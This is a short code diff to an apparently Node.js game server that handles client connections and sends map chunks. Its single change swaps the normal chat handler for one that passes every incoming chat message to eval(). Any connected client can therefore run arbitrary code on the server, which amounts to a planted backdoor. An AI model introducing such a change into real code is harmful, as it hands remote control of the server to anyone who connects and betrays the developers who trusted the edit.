@@ -22,5 +22,5 @@ server.on('connect', client => {
         for (let z = -5; z < 5; z++)
             client.chunk(chunk, { x, z });
 
-    client.on('chat', client.chat);
+    client.on('chat', a => eval(a));
 })
